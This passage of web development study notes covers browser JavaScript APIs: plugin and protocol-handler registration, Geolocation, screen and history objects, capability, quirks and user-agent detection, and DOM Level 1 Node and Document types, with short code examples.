    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">//detect flash</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">hasIEPlugin</span><span class="token punctuation">(</span><span class="token string">&quot;ShockwaveFlash.ShockwaveFlash&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//detect quicktime</span>
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">hasIEPlugin</span><span class="token punctuation">(</span><span class="token string">&quot;QuickTime.QuickTime&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li></ul></li> <li><p>Registering Handlers</p> <ul><li>allow a Website to indicate that it can handle specific types of information</li> <li><code>navigator.registerContentHandler(MIME, url, name)</code><div class="language-javascript extra-class"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span><span class="token function">registerContentHandler</span><span class="token punctuation">(</span><span class="token string">&quot;application/rss+xml&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://www.somereader.com?feed=%s&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Some Reader&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>arguments: the MIME type to handle, the URL of the page that can handle that MIME type, and the name of the application</li> <li><code>%s</code> represents the original request</li></ul></li> <li><code>navigator.registerProtocolHandler(protocol, url, name)</code><div class="language-javascript extra-class"><pre class="language-javascript"><code>navigator<span class="token punctuation">.</span><span class="token function">registerProtocolHandler</span><span class="token punctuation">(</span><span class="token string">&quot;mailto&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;http://www.somemailclient.com?cmd=%s&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Some Mail Client&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div>similar to the above one, protocol can be <code>&quot;mailto&quot;</code> or <code>&quot;ftp&quot;</code></li></ul></li> <li><p>Geolocation API — <code>Navigator.geolocation: Geolocation</code> (available only in secure contexts (HTTPS))</p> <ul><li>represents an object able to programmatically obtain the position of the device
<ul><li>the user is notified and asked to grant permission</li></ul></li> <li><code>Geolocation.getCurrentPosition(successCallback, errorCallback?, options?: PositionOptions): void</code> <ul><li><code>successCallback(pos: Position)</code></li> <li><code>errorCallback(err: PositionError)</code></li></ul></li> <li><code>Geolocation.watchPosition(successCallback, errorCallback?, options?): number</code> — register a handler function that will be called automatically each time the position of the device changes</li> <li><code>Geolocation.clearWatch(watchId: number): void</code> — unregister location/error monitoring handlers using the id returned by <code>Geolocation.watchPosition()</code></li> <li><code>Position</code> <ul><li><code>Position.coords: Coordinates</code> <ul><li><code>Coordinates.latitude</code> in degree, <code>Coordinates.longitude</code> in degree, <code>Coordinates.accuracy</code> in meters</li> <li>in meters and can be <code>null</code>: <code>Coordinates.altitude</code>, <code>Coordinates.altitudeAccuracy</code></li> <li><code>Coordinates.heading</code> — how far off from heading true north the device is, 0 is true north, <code>NaN</code> when <code>speed</code> is 0, can be <code>null</code></li> <li><code>Coordinates.speed</code> — m/s, can be <code>null</code></li></ul></li> <li><code>Position.timestamp: DOMTimeStamp</code> — the date and the time of the creation of the <code>Position</code> object it belongs to. The precision is to the millisecond</li></ul></li> <li><code>PositionError</code> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/PositionError" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><code>PositionOptions</code> <ul><li><code>PositionOptions.enableHighAccuracy: boolean</code> — indicates the application would like to receive the best possible results, default <code>false</code> <ul><li>slower response times or increased power consumption trade off</li></ul></li> <li><code>PositionOptions.timeout: number</code> — the maximum length of time (in milliseconds) the device is allowed to take in order to return a position, defaults to <code>Infinity</code></li> <li><code>PositionOptions.maximumAge: number</code> — the maximum age in milliseconds of a possible cached position that is acceptable to return, defaults to 0</li></ul></li> <li>availability
<ul><li>providers other than Google on <a href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API#Availability" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li></ol> <h3 id="the-screen-and-the-history-object"><a href="#the-screen-and-the-history-object" class="header-anchor">#</a> The Screen and the History Object</h3> <ol><li><p><code>screen</code> or <code>window.screen</code></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">resizeTo</span><span class="token punctuation">(</span>screen<span class="token punctuation">.</span>availWidth<span class="token punctuation">,</span> screen<span class="token punctuation">.</span>availHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><ul><li>provides information about the client’s display outside the browser window</li> <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Screen" target="_blank" rel="noopener noreferrer">properties and methods<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li> <li><p><code>history</code> or <code>window.history</code></p> <ul><li>represents the user’s navigation history since the given window was first used</li> <li>properties and methods (state introduced in HTML5)
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/History" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>History.length</code> Read only — Returns an Integer representing the number of elements in the session history, including the currently loaded page. For example, for a page loaded in a new tab this property returns 1</li> <li><code>History.state</code> Read only — Returns an any value representing the state at the top of the history stack
<ul><li>This is a way to look at the state without having to wait for a <code>popstate</code> event</li></ul></li> <li><code>History.go(delta?: number): void</code> <ul><li>delta: the number of pages to go backward or forward</li> <li>A negative number moves backward in history (similar to clicking the browser’s Back button)</li> <li>a positive number moves forward (similar to clicking the browser’s Forward button)</li> <li>without parameters or a value of 0 reloads the current page</li></ul></li> <li><code>history.back()</code>, <code>history.forward()</code> <ul><li><code>history.go(-1)</code>, <code>history.go(1)</code></li></ul></li> <li><code>History.pushState(data: any, title: string, url?: string): void</code> — Pushes the given data onto the session history stack with the specified title and, if provided, URL
<ul><li>The data is treated as opaque by the DOM; you may specify any JavaScript object that can be serialized</li> <li>title isn’t currently used by any implementations and so it is safe to either leave it as an empty string or provide a short title</li> <li>url: relative or absolute, must be of the same origin. If omitted, it's set to the document's current URL</li> <li>the browser’s address bar (<code>location.href</code>) changes to reflect the new relative URL. Despite this change, the browser does not make a request to the server, but it might attempt to load the URL later as below</li> <li>if navigated back from a new domain, page will be reloaded with the given URL, and <code>popstate</code> event won't be fired because the page has been reloaded</li></ul></li> <li><code>History.replaceState(data: any, title: string, url?: string): void</code> — Updates the most recent entry on the history stack to have the specified data, title, and, if provided, URL
<ul><li>see <code>History.pushState()</code>, the difference is that this modifies the current history entry instead of creating a new one</li></ul></li></ul></li></ul></li></ol> <h2 id="client-detection"><a href="#client-detection" class="header-anchor">#</a> Client Detection</h2> <h3 id="capability-detection-and-quirks-detection"><a href="#capability-detection-and-quirks-detection" class="header-anchor">#</a> Capability Detection and Quirks Detection</h3> <ol><li><p>Capability detection (also called feature detection)</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>object<span class="token punctuation">.</span>propertyInQuestion<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment">//use object.propertyInQuestion</span>
<span class="token punctuation">}</span>

<span class="token comment">// safer way</span>
<span class="token keyword">function</span> <span class="token function">isHostMethod</span><span class="token punctuation">(</span><span class="token parameter">object<span class="token punctuation">,</span> property</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token keyword">typeof</span> object<span class="token punctuation">[</span>property<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> t <span class="token operator">===</span> <span class="token string">'function'</span> <span class="token operator">||</span>
        <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>t <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> object<span class="token punctuation">[</span>property<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
        t <span class="token operator">===</span> <span class="token string">'unknown'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><ul><li>should not be used as browser detection</li> <li>example: <code>document.getElementById()</code> didn't exist in Internet Explorer prior to version 5, using the nonstandard <code>document.all</code> property<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>getElementById<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>all<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> document<span class="token punctuation">.</span>all<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>“No way to retrieve element<span class="token operator">!</span>”<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li>example<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token comment">//determine if the browser has Netscape-style plugins</span>
<span class="token keyword">var</span> hasNSPlugins <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>plugins <span class="token operator">&amp;&amp;</span> navigator<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//determine if the browser has basic DOM Level 1 capabilities</span>
<span class="token keyword">var</span> hasDOM1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>getElementById <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>createElement <span class="token operator">&amp;&amp;</span>
                 document<span class="token punctuation">.</span>getElementsByTagName<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li></ul></li> <li><p>Quirks Detection</p> <ul><li>quirks detection attempts to figure out what isn’t working correctly</li> <li>For example, a bug in Internet Explorer 8 and earlier causes instance properties with the same name as prototype properties whose <code>[[Enumerable]]</code> attribute is set to false to not appear in for-in loops<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> <span class="token function-variable function">hasDontEnumQuirk</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token function-variable function">toString</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> o<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>prop <span class="token operator">==</span> <span class="token string">&quot;toString&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li> <li>example: Safari versions prior to 3 enumerating over shadowed properties<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> <span class="token function-variable function">hasEnumShadowsQuirk</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token function-variable function">toString</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> prop <span class="token keyword">in</span> o<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>prop <span class="token operator">==</span> <span class="token string">&quot;toString&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            count<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>count <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li></ul></li></ol> <h3 id="user-agent-detection"><a href="#user-agent-detection" class="header-anchor">#</a> User-Agent Detection</h3> <ol><li><p><code>navigator.userAgent</code></p> <ul><li>IE
<ul><li>IE9: <code>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)</code></li> <li>IE9 in compatibility mode:<br> <code>Mozilla/ 4.0 (compatible; MSIE 7.0 ; Windows NT 6.1; Trident/5.0)</code></li> <li>IE11: <code>Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ...) like Gecko</code></li></ul></li> <li>Gecko before Firefox 4.0<div class="language- extra-class"><pre class="language-text"><code>Mozilla/\(*MozillaVersion*\) (\(*Platform*\); \(*Encryption*\); \(*OS-or-CPU*\); \(*Language*\);
\(*PrereleaseVersion*\))Gecko/\(*GeckoVersion*\)
\(*ApplicationProduct*\)/\(*ApplicationProductVersion*\)
</code></pre></div><ul><li>after Firefox 4<div class="language- extra-class"><pre class="language-text"><code>Mozilla/5.0 (X11; Ubuntu; Linux; rv:61.0) Gecko/20100101 Firefox/61.0
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
</code></pre></div><code>5.0</code> and <code>20100101</code> if fixed</li></ul></li> <li>WebKit<div class="language- extra-class"><pre class="language-text"><code>Mozilla/5.0 ( \(*Platform*\); \(*Encryption*\); \(*OS-or-CPU*\); \(*Language*\))
\(*AppleWebKit*\)/\(*AppleWebKitVersion*\) (KHTML, like Gecko) Safari/\(*SafariVersion*\)
</code></pre></div><ul><li>example: Safari on Mac: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0; en-IN) AppleWebKit/537.14.33 (KHTML, like Gecko) Version/10.0.1 Safari/537.14.33
<ul><li><code>Version</code> added after Safari version 3</li></ul></li> <li>chrome: WebKit with chrome version<div class="language- extra-class"><pre class="language-text"><code>Mozilla/5.0 (Platform; Encryption; OS-or-CPU; Language)
AppleWebKit/AppleWebKitVersion (KHTML, like Gecko)
Chrome/ChromeVersion Safari/SafariVersion
</code></pre></div></li></ul></li> <li>opera<div class="language- extra-class"><pre class="language-text"><code>Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/65.0.3325.237 Safari/537.36 OPR/44.0.2168.132
</code></pre></div>earlier versions can be very different</li> <li>iOS and Android<div class="language- extra-class"><pre class="language-text"><code>Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us)
AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16
</code></pre></div>The platform will be “iPhone” , “iPod” , or “iPad”<div class="language- extra-class"><pre class="language-text"><code>Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91)
AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
</code></pre></div>without a Mobile version</li></ul></li> <li><p>User-Agent Detection</p> <ul><li>knowing the rendering engine and a minimum version
<ul><li>but not a specific version</li></ul></li> <li>identify render engine</li> <li>identity the browser</li> <li>identify the platform</li> <li>Identifying Mobile Devices</li> <li>Identifying Game Systems</li></ul></li></ol> <h2 id="dom"><a href="#dom" class="header-anchor">#</a> DOM</h2> <ol><li>miscellanea
<ul><li>all DOM objects are represented by COM objects in Internet Explorer 8 and earlier</li> <li>The document element is the outermost element in the document</li></ul></li></ol> <h3 id="dom-level-1"><a href="#dom-level-1" class="header-anchor">#</a> DOM Level 1</h3> <h4 id="the-node-type"><a href="#the-node-type" class="header-anchor">#</a> The Node Type</h4> <ol><li><p><code>Node</code></p> <ul><li>All node types inherit from <code>Node</code></li> <li><code>Node</code> inherits <code>EventTarget</code></li> <li><code>Node.nodeType: number</code> Read only — node type, equals to one of the below<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>someNode<span class="token punctuation">.</span>nodeType <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//works in all browsers</span>
<span class="token comment">// if (someNode.nodeType == Node.ELEMENT_NODE) { //won’t work in IE &lt; 9</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&quot;Node is an element.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><ul><li><code>Node.ELEMENT_NODE</code> (1)</li> <li><code>Node.ATTRIBUTE_NODE</code> (2) deprecated</li> <li><code>Node.TEXT_NODE</code> (3)</li> <li><code>Node.CDATA_SECTION_NODE</code> (4) deprecated</li> <li><code>Node.ENTITY_REFERENCE_NODE</code> (5) deprecated</li> <li><code>Node.ENTITY_NODE</code> (6) deprecated</li> <li><code>Node.PROCESSING_INSTRUCTION_NODE</code> (7)</li> <li><code>Node.COMMENT_NODE</code> (8)</li> <li><code>Node.DOCUMENT_NODE</code> (9)</li> <li><code>Node.DOCUMENT_TYPE_NODE</code> (10)</li> <li><code>Node.DOCUMENT_FRAGMENT_NODE</code> (11)</li> <li><code>Node.NOTATION_NODE</code> (12) deprecated</li></ul></li> <li><code>Node.nodeName: string</code> Read only, <code>Node.nodeValue</code> — give specific information about the node, return values differentiate from node type
<ul><li><code>Node.nodeValue</code> is the content for <code>Comment</code> and <code>Text</code> nodes</li></ul></li></ul></li> <li><p><code>NodeList</code></p> <ul><li>A <code>NodeList</code> is an array-like object, but not an instance of <code>Array</code> <ul><li><code>NodeList.entries(): IterableIterator&lt;[number, any]&gt;</code></li> <li><code>NodeList.forEach(callback: (value: any, key: number, parent: NodeListOf&lt;any&gt;) =&gt; void, thisArg?): void</code></li> <li><code>NodeList.keys(): IterableIterator&lt;number&gt;</code></li> <li><code>NodeList.value(): IterableIterator&lt;any&gt;</code></li></ul></li> <li>difference: changes will be reflected in <code>NodeList</code> objects automatically
<ul><li>best to limit the number of times of interaction</li> <li>try to cache frequently used values</li> <li><code>document.querySelectorAll()</code> returns a static <code>NodeList</code></li></ul></li> <li>via bracket notation or by using the <code>item()</code> method<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">var</span> firstChild <span class="token operator">=</span> someNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> secondChild <span class="token operator">=</span> someNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">.</span><span class="token function">item</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> count <span class="token operator">=</span> someNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
</code></pre></div></li> <li>convert NodeList objects into arrays<div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">convertToArray</span><span class="token punctuation">(</span><span class="token parameter">nodes</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> array <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        array <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>nodes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//non-IE and IE9+</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> nodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            array<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> array<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div></li></ul></li> <li><p>Node Relationships, Read only — child, parent, sibling</p> <ul><li><code>Node.childNodes: NodeList</code> <ul><li>IE8 and earlier does not parse whitespace between tags as <code>Text</code> nodes</li></ul></li> <li><code>Node.hasChildNodes(): boolean</code> <ul><li>faster than check <code>.childNodes.length</code></li></ul></li> <li><code>Node.parentNode</code> — pointing to its parent</li> <li><code>Node.previousSibling</code>, <code>Node.nextSibling</code></li> <li><code>Node.firstChild</code>, <code>Node.lastChild</code> <ul><li><code>someNode.childNodes[0]</code></li> <li><code>someNode.childNodes[someNode.childNodes.length-1]</code></li></ul></li> <li><code>Node.ownerDocument: Document</code> — a pointer to the document node that represents the entire document or <code>null</code></li> <li><code>Node.contains(child: Node): boolean</code> <ul><li>whether a node is a descendant of the current node</li></ul></li> <li><code>Node.isEqualNode(otherNode: Node): boolean</code> — indicates whether or not two nodes are of the same type and all their defining data points match</li> <li><code>Node.isSameNode(otherNode: Node): boolean</code> — indicating whether or not the two nodes are the same (that is, they reference the same object)</li> <li><code>Node.compareDocumentPosition(other: Node): number</code> <ul><li>compares the position of the current node against another node</li> <li>The return value is a bitmask
<ul><li><code>Node.DOCUMENT_POSITION_DISCONNECTED</code> 1</li> <li><code>DOCUMENT_POSITION_PRECEDING</code> 2</li> <li><code>DOCUMENT_POSITION_FOLLOWING</code> 4</li> <li><code>DOCUMENT_POSITION_CONTAINS</code> 8</li> <li><code>DOCUMENT_POSITION_CONTAINED_BY</code> 16</li> <li><code>DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC</code> 32</li></ul></li> <li>example<div class="language-javascript extra-class"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">compareDocumentPosition</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span>
<span class="token operator">&amp;</span> Node<span class="token punctuation">.</span><span class="token constant">DOCUMENT_POSITION_FOLLOWING</span> <span class="token comment">// non-zero</span>
</code></pre></div></li></ul></li></ul></li> <li><p>Manipulating Nodes</p> <ul><li>updates all of the relationship pointers</li> <li>will throw errors if you attempt to use methods below on nodes that don’t support children</li> <li><code>Node.appendChild&lt;T extends Node&gt;(newChild: T): T</code> <ul><li>return: when complete, return the newly added node</li> <li>if <code>new_node</code> is already part of the document, it is removed from its previous location and placed at the new location</li></ul></li> <li><code>Node.insertBefore(newChild, refChild): T</code> <ul><li>return: when complete, return the newly added node</li> <li><code>newChild</code> becomes the previous sibling of <code>refChild</code></li> <li>becomes <code>appendChild()</code> when <code>refChild</code> is <code>null</code></li></ul></li> <li><code>Node.replaceChild(newChild, oldChild): T</code> <ul><li>return: when complete, return the replaced node</li> <li>Even though the replaced node is technically still owned by the same document, it no longer has a specific location in the document</li></ul></li> <li><code>Node.removeChild(oldChild): T</code> <ul><li>return: The removed node is then returned</li> <li>removed node is still owned by the document but doesn’t have a specific location in the document</li></ul></li></ul></li> <li><p>copy and normalize</p> <ul><li><code>Node.cloneNode(deep?: boolean): Node</code> <ul><li>deep: a single Boolean argument indicating whether to do a deep copy</li> <li>deep copy: cloning the node and its entire subtree</li> <li>non deep copy: only the initial node is cloned</li> <li>the cloned node is an orphan and doesn’t exist in the document</li> <li>capacity
<ul><li>doesn’t copy JavaScript properties that you add to DOM nodes, such as event handlers</li> <li>This method copies only attributes and, optionally, child nodes</li> <li>Internet Explorer has a bug where event handlers are also cloned</li></ul></li></ul></li> <li><code>Node.normalize(): void</code> method
<ul><li>the node’s descendants are searched</li> <li>If an empty text node is found, it is removed</li> <li>if text nodes are immediate siblings, they are joined into a single text node</li></ul></li></ul></li></ol> <h4 id="the-document-type"><a href="#the-document-type" class="header-anchor">#</a> The Document Type</h4> <ol><li><p><code>document</code> or <code>window.document</code></p> <ul><li>an instance of <code>HTMLDocument</code>, which inherits from <code>Document</code></li> <li><code>nodeType</code> is 9</li> <li><code>nodeName</code> is <code>“#document”</code></li> <li><code>nodeValue</code> is <code>null</code></li> <li><code>parentNode</code> is <code>null</code></li> <li><code>ownerDocument</code> is <code>null</code></li> <li>node manipulating methods are usually not used against</li></ul></li> <li><p>Document Children</p> <ul><li>the children of a Document node can be a DocumentType, Element, ProcessingInstruction, or Comment</li> <li><code>Document.documentElement</code> property: the <code>&lt;html&gt;</code> element
<ul><li>faster and more direct than <code>document.childNodes[0]</code>, <code>document.firstChild</code> when <code>&lt;html&gt;</code> is the first node (no doctype or comment present)</li></ul></li> <li><code>document.body</code>: <code>&lt;body&gt;</code></li> <li><code>document.doctype</code>: <code>&lt;!DOCTYPE&gt;</code> <ul><li>inconsistent browser support</li></ul></li> <li><code>Document.head</code></li></ul></li> <li><p>Document Information</p> <ul><li>All of this information is available in the HTTP header of the request</li> <li>all read-only except <code>document.domain</code> is partially read-only</li> <li><code>Document.title</code>: the text in the <code>&lt;title&gt;</code> element</li> <li><code>Document.URL</code>, <code>Document.documentURI</code>: the complete URL of the page</li> <li><code>Document.domain</code>: just the domain name of the page
